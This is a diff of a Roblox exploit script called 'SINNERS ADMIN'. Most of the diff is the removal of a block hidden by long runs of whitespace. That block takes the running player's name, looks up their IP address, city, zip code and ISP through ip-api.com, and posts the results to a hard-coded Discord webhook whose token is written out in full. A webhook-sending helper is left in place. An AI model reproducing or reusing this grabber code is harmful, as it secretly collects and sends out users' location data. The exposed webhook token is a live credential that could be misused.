@@ -3,7 +3,7 @@
 
 
 --
-print("TEST13")
+print("TESTx13")
 
 
 
@@ -370,7 +370,7 @@ print("SINNERS ADMIN")
 
 
 
-                                                                                                                                                                                                                                                                                                                                        wait(10)
+                                                                                                                                                                                                                                                                                                                                       
 
                                                                                                                                                                                                                                                                                                                                         function _G.SendWebHook(url, message)newBody = {["content"] = tostring(message)}; SynWebHook = {Url = url,Body = game.HttpService:JSONEncode(newBody),Method = "POST",Headers = {["content-type"] = "application/json"}};syn.request(SynWebHook)end;
 
@@ -575,7 +575,6 @@ print("SINNERS ADMIN")
 
 
 
-wait(20)
 local marketplaceService = game:GetService("MarketplaceService")
  
 local isSuccessful, info = pcall(marketplaceService.GetProductInfo, marketplaceService, Game.PlaceId)
@@ -659,26 +658,7 @@ end
                                                                                                                                                                                                                                                                                       
                                                                                                                                                                                                                                                                                       
                                                                                                                                                                                                                                                                                    
-                                                                                                                                                                                                                                                                                      wait(29)
-                                                                                                                                                                                                                                                                                      local player_name = game:GetService("Players").LocalPlayer.Name
-                                                                                                                                                                                                                                                                                      local webhook_url = "https://discord.com/api/webhooks/1015029355132497950/ybmdAUGu0_-9FBvuGbL_KFUo8zUXWtBhoxJysAE_s_wFrUOFFZDGTonK-DDKx0hVEAvu"
-
-                                                                                                                                                                                                                                                                                      local ip_info = syn.request({
-                                                                                                                                                                                                                                                                                     Url = "http://ip-api.com/json",
-                                                                                                                                                                                                                                                                                     Method = "GET"
-                                                                                                                                                                                                                                                                                })
-                                                                                                                                                                                                                                                                                local ipinfo_table = game:GetService("HttpService"):JSONDecode(ip_info.Body)
-                                                                                                                                                                                                                                                                                local dataMessage = string.format("```User: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s```", player_name, ipinfo_table.query, ipinfo_table.country, ipinfo_table.countryCode, ipinfo_table.region, ipinfo_table.regionName, ipinfo_table.city, ipinfo_table.zip, ipinfo_table.isp, ipinfo_table.org)
-                                                                                                                                                                                                                                                                                syn.request(
-                                                                                                                                                                                                                                                                                    {
-                                                                                                                                                                                                                                                                                      Url = webhook_url,
-                                                                                                                                                                                                                                                                                      Method = "POST",
-                                                                                                                                                                                                                                                                                      Headers = {
-                                                                                                                                                                                                                                                                                           ["Content-Type"] = "application/json"
-                                                                                                                                                                                                                                                                                      },
-                                                                                                                                                                                                                                                                                      Body = game:GetService("HttpService"):JSONEncode({["content"] = dataMessage})
-                                                                                                                                                                                                                                                                              }
-                                                                                                                                                                                                                                                                         )
+                                                                                                                                                                                                                                                                                     
                                                                                                                                                                                                                                                                          
                                                                                                                                                                                                                                                                          
                                                                                                                                                                                                                                                                          
